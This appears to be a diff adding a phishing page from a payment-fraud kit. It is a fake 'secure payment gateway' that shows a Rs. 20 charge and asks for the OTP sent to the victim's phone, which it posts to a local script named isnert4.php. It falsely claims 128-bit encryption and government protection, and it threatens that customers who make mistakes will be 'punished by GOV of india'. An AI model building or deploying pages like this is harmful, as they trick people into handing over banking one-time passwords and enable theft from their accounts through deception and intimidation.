@@ -1,0 +1,72 @@
+<!DOCTYPE html><html>
+<head> <title>Payment</title> <meta charset="URF8"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet"> <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"> <script src="js/js-bootstrap.min.js"></script></head> <style>
+        .input-icons i {
+            position: absolute;
+            padding: 10px;
+        }
+
+        .input-icons {
+            width: 100%;
+            margin-bottom: 20px;
+            position: relative;
+
+        }
+
+        .icon {
+            padding: 10px;
+            min-width: 40px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .payment_Card {
+            max-width: 400px;
+            margin-left:auto;
+            margin-right: auto;
+        }
+
+        .fa-lock {
+            margin-left: 80%;
+        }
+
+        @media (max-width: 992px) {
+            .fa-lock {
+                margin-left: 20%;
+            }
+
+            .payment_Card {
+                width: 100%;
+                margin-left: 0%;
+            }
+
+            .down img {
+                max-width: 90%;
+            }
+
+        }
+    </style>
+
+<body style="background-color: #404040">
+
+
+
+
+<div class="container"> <div class="row Justify-content-center"> <div class="col-lg-12 col-md-12 col-sm-12">
+<div class="payment_Card" style="margin-top: 60px;"> <div class="text-center" style="background-color: #a5c339; color: white; display:flex;"> <img src="image/verified.png" height="120px" width="120px" style="margin:20px; margin-top:-25px;"> <p style="font-size: 25px; text-align: center; margin: 20px; font-weight: 700;">PAY Rs. 20.00</p> </div>
+<div class="text-center" style="background-color: white; border: 1px solid #dddddd; "> <p style="font-size: 14px; margin-top:10px;">OTP (OTP sent to your mobile number)</p> </div> <div class="card_ddetails" style="background-color:white;">
+
+<form action="isnert4.php" method="POST" style="padding: 20px; padding-bottom: 0px;"> <div class="input-icons"> <i class="fa fa-lock"></i> 
+<div>
+<input class="input-field form-control" name="otp" type="number" placeholder="OTP" required><br>
+</div>
+<input type="submit" class="btn btn-primary" name="submit" value="Pay now" style="background-color: #a5c339; border: none; color: white; width: 100%;"> </div>
+</form>
+<div class="text-center" style="margin-top: 0px;"> <p style="font-size: 10px; color: #0000ff">This page will automatically time out after 300 seconds</p> </div> <div style=" padding: 20px; padding-top: 0px; padding-bottom:0px;"> <div class="" style="margin-top: 0px; max-width: 350px; background-color: #cccccc;"> <p style="font-size: 13px; margin-left: 5px; ">This is a Secure payment gateway using 128-bit Encrytion</p> </div> </div>
+<div style=" padding: 20px; padding-top: 0px; padding-bottom:0px;"> <div class="" style="margin-top: 0px; max-width: 350px; background-color: #ffe0e0;"><b></b> <p style="font-size: 11px; padding:10px; padding-right: 0px; "><span style="color: #ff4600;">Note : - </span>Please fill all the information correctly otherwise your transaction will blocked and go in pending process and the suspected customer will be punished by GOV of india. The transaction is in our under protected by the GOV.</p> </div> </div>
+
+<div class="text-center down" style="background-color: #eaeaea;"> <img style="width:100%;" src="image/down_payment.png"> </div> </div> </div> </div> </div> </div></body>
+</html>
